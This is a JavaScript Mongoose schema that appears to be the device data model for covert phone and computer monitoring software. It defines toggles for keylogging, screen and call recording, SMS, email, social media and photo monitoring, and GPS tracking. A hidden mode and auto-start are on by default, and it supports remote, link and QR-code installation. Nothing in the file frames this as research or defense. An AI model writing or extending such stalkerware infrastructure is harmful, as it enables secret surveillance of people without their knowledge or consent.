const mongoose = require('mongoose');

const deviceSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  deviceId: {
    type: String,
    required: true,
    unique: true
  },
  name: {
    type: String,
    required: true,
    trim: true
  },
  type: {
    type: String,
    enum: ['android', 'ios', 'desktop', 'tablet'],
    required: true
  },
  platform: {
    type: String,
    required: true
  },
  version: {
    type: String,
    required: true
  },
  model: {
    type: String,
    trim: true
  },
  manufacturer: {
    type: String,
    trim: true
  },
  serialNumber: {
    type: String,
    trim: true
  },
  imei: {
    type: String,
    trim: true
  },
  phoneNumber: {
    type: String,
    trim: true
  },
  status: {
    type: String,
    enum: ['active', 'inactive', 'offline', 'error'],
    default: 'inactive'
  },
  lastSeen: {
    type: Date,
    default: Date.now
  },
  lastSync: {
    type: Date,
    default: Date.now
  },
  syncInterval: {
    type: Number,
    default: 300000 // 5 minutes in milliseconds
  },
  features: {
    keylogger: { type: Boolean, default: false },
    screenRecorder: { type: Boolean, default: false },
    gpsTracking: { type: Boolean, default: false },
    callMonitoring: { type: Boolean, default: false },
    smsMonitoring: { type: Boolean, default: false },
    callRecording: { type: Boolean, default: false },
    liveScreen: { type: Boolean, default: false },
    socialMedia: { type: Boolean, default: false },
    appMonitoring: { type: Boolean, default: false },
    browserHistory: { type: Boolean, default: false },
    emailMonitoring: { type: Boolean, default: false },
    calendarMonitoring: { type: Boolean, default: false },
    photoMonitoring: { type: Boolean, default: false },
    videoMonitoring: { type: Boolean, default: false },
    geofencing: { type: Boolean, default: false },
    keywordAlerts: { type: Boolean, default: false },
    appBlocker: { type: Boolean, default: false },
    remoteLocation: { type: Boolean, default: false }
  },
  permissions: {
    location: { type: Boolean, default: false },
    camera: { type: Boolean, default: false },
    microphone: { type: Boolean, default: false },
    storage: { type: Boolean, default: false },
    contacts: { type: Boolean, default: false },
    calendar: { type: Boolean, default: false },
    phone: { type: Boolean, default: false },
    sms: { type: Boolean, default: false },
    accessibility: { type: Boolean, default: false },
    overlay: { type: Boolean, default: false },
    background: { type: Boolean, default: false }
  },
  settings: {
    hiddenMode: { type: Boolean, default: true },
    autoStart: { type: Boolean, default: true },
    batteryOptimization: { type: Boolean, default: false },
    dataUsage: {
      limit: { type: Number, default: 100 }, // MB
      warning: { type: Number, default: 80 } // percentage
    },
    storage: {
      limit: { type: Number, default: 1000 }, // MB
      warning: { type: Number, default: 80 } // percentage
    }
  },
  network: {
    wifi: {
      ssid: String,
      bssid: String,
      strength: Number
    },
    cellular: {
      carrier: String,
      signal: Number,
      type: String
    },
    ip: String,
    mac: String
  },
  battery: {
    level: Number,
    isCharging: Boolean,
    temperature: Number
  },
  storage: {
    total: Number,
    used: Number,
    available: Number
  },
  memory: {
    total: Number,
    used: Number,
    available: Number
  },
  location: {
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    altitude: Number,
    speed: Number,
    heading: Number,
    timestamp: Date
  },
  installation: {
    method: {
      type: String,
      enum: ['manual', 'remote', 'link', 'qr'],
      default: 'manual'
    },
    date: {
      type: Date,
      default: Date.now
    },
    installer: String,
    notes: String
  },
  security: {
    encryptionKey: String,
    deviceToken: String,
    lastAuth: Date,
    authAttempts: { type: Number, default: 0 },
    locked: { type: Boolean, default: false }
  },
  metadata: {
    userAgent: String,
    screenResolution: String,
    language: String,
    timezone: String,
    locale: String
  },
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

// Indexes
deviceSchema.index({ userId: 1 });
deviceSchema.index({ deviceId: 1 });
deviceSchema.index({ status: 1 });
deviceSchema.index({ lastSeen: -1 });
deviceSchema.index({ 'location.latitude': 1, 'location.longitude': 1 });

// Virtual for online status
deviceSchema.virtual('isOnline').get(function() {
  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
  return this.lastSeen > fiveMinutesAgo;
});

// Virtual for battery percentage
deviceSchema.virtual('batteryPercentage').get(function() {
  return this.battery?.level || 0;
});

// Virtual for storage percentage
deviceSchema.virtual('storagePercentage').get(function() {
  if (!this.storage?.total) return 0;
  return Math.round((this.storage.used / this.storage.total) * 100);
});

// Pre-save middleware to update timestamps
deviceSchema.pre('save', function(next) {
  this.updatedAt = new Date();
  next();
});

// Instance method to update last seen
deviceSchema.methods.updateLastSeen = function() {
  this.lastSeen = new Date();
  return this.save();
};

// Instance method to update location
deviceSchema.methods.updateLocation = function(locationData) {
  this.location = {
    ...this.location,
    ...locationData,
    timestamp: new Date()
  };
  return this.save();
};

// Instance method to update network info
deviceSchema.methods.updateNetwork = function(networkData) {
  this.network = { ...this.network, ...networkData };
  return this.save();
};

// Instance method to update battery info
deviceSchema.methods.updateBattery = function(batteryData) {
  this.battery = { ...this.battery, ...batteryData };
  return this.save();
};

// Instance method to update storage info
deviceSchema.methods.updateStorage = function(storageData) {
  this.storage = { ...this.storage, ...storageData };
  return this.save();
};

// Instance method to check if feature is enabled
deviceSchema.methods.isFeatureEnabled = function(feature) {
  return this.features[feature] === true;
};

// Instance method to enable feature
deviceSchema.methods.enableFeature = function(feature) {
  this.features[feature] = true;
  return this.save();
};

// Instance method to disable feature
deviceSchema.methods.disableFeature = function(feature) {
  this.features[feature] = false;
  return this.save();
};

// Static method to find online devices
deviceSchema.statics.findOnline = function() {
  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
  return this.find({ lastSeen: { $gt: fiveMinutesAgo } });
};

// Static method to find devices by user
deviceSchema.statics.findByUser = function(userId) {
  return this.find({ userId }).populate('userId', 'firstName lastName email');
};

// Static method to find devices by type
deviceSchema.statics.findByType = function(type) {
  return this.find({ type });
};

module.exports = mongoose.model('Device', deviceSchema); 